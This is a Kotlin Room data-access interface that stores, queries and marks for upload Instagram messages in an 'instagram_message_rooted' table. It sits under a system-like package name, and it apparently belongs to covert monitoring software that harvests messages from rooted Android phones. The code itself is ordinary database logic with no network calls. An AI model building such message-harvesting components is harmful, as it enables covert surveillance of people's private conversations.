package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.InstagramMessageRooted
import com.android.services.util.AppConstants
import java.util.*

@Dao
interface InstagramMessageRootedDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(instagram_message: List<InstagramMessageRooted>)

    @Query("Select * from instagram_message_rooted where status =:status ORDER BY date DESC limit ${AppConstants.imLogsUploadLimit}")
    fun selectAllInstagramMessageMessages(status: Int): List<InstagramMessageRooted>

    @Query("Update instagram_message_rooted set status=:updated_status where date BETWEEN :startDate AND :endDate")
    fun update(updated_status: Int, startDate: Date, endDate: Date): Int

    @Query("select max(timeStamp) from instagram_message_rooted")
    fun selectMaxTimeStamp(): Long?
}